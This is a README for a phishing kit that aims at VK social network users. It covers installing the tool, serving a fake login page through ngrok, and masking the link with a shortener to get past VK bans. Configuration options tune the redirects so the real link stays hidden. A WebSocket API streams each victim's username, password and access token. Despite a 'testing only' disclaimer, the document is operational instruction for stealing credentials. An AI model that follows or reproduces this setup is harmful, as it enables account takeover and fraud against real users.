# Disclaimer

This tool is ONLY FOR testing. Author is not responsible for anything you do with this tool.

## Installation

Install [node js and npm](https://nodejs.org/en/download/) if not installed yet

1. Go to [Releases](https://github.com/xxhax-team/vk-phishing/releases)

2. Download the latest

3. Unzip it into the folder

4. Open this folder in terminal/cmd

5. Execute following commands in the terminal:

```bash
# Install dependencies and make build
npm install
# or yarn install

# Run the app
npm start
```

6. After successful launch you will see something like:

```bash
ℹ Listening public url: https://blah.eu.ngrok.io
ℹ Shorten url is: https://vk.cc/bRuH
```

#### IMPORTANT

1. DO NOT SHARE PUBLIC URL IN VK You may get banned. Use shorten URL instead

2. Social options you may change in `config/aye-kosmonavt.yml`

## Configuration

### Ngrok

Ngrok configuration file is in `config/ngrok.yml`. Supported only global options.

Read more at [ngrok docs](https://ngrok.com/docs#config)

### Aye Kosmonavt

Read his docs [on github](https://github.com/xxhax-team/aye-kosmonavt-api#readme)

Here it used for hide ngrok links, what often are banned by VK.
For more info join Aye Kosmonavt Telegram [@xxhaxteam_ayekosmonavt_leaks](https://t.me/xxhaxteam_ayekosmonavt_leaks)

Config stored in `config/aye-kosmonavt.yml`. You can create multiple presets for you convenience and select it by `use` option.

Options used in config:

1.  `beforeLoginTitle` - link title what will be displayed in tab title or in social media link preview

2.  `beforeLoginImage` - image what will be displayed on redirection page.

3.  `beforeLoginSocialImage` - e.g `OgImage`, will be used in social media preview

4.  `beforeLoginRedirTime` - time before user will redirected to phishing (less better, but not 0, because 0 will expose your original link)

5.  `afterLoginTitle` - title, of tab, for what user will be redirected after successful authorization (such as all `afterLogin*`)

6.  `afterLoginImage` - Background image of tab

7.  `afterLoginUrl` - url, to what user will be redirected

8.  `afterLoginRedirTime` - time to redirect to `afterLoginUrl`, better is 5-10 secs.

## WebSocket API (based on Socket.io)

Events:

1. `user_auth_attempt`
   Event is called on every login attempt

```ts
type UserAuthAttemptEvent = {
  status: number // this is auth status constant*
  username: string
  password: string
}
```

\*See auth status constants in `server/auth-constants.js`

2. `user_successful_auth`
   Event is called when users logins successful

```ts
type UserSuccessfulAuthEvent = {
  first_name: string;
  last_name: string;
  token: string;
} && UserAuthAttemptEvent
```

3. `ngrok_connected`
   Event is called when ngork is connected

```ts
type NgrokConnectedEvent = {
  publicUrl: string
  shortUrl: string
}
```

Public & Short urls received form [aye-kosmonavt-api](https://npmjs.org/package/aye-kosmonavt-api)

4. `ngrok_fail_start`
   Event is called if ngrok fails start

```ts
type NgrokFailStartEvent = Error
```

## Change log

**1.5.2**

- Updated VK verification checkmark
- Fixed some shit in docs

**1.5.0**

- Added WebSocket Api
- Added renderer switch (Source only, -r or --renderer flag, default static)
- You can list renderers (-l or --list-renderers flag)

**1.4.2**

- Changed aye-kosmonavt Url

**1.4.0**

- Icon updates
- Fixed some styles
- Added VK login tests

**1.3.0**

![speed comparison](speed-comparison.gif)

- Removed /admin
- Added static renderer (uses `nuxt generate`) for 2x faster launch & page ttl.
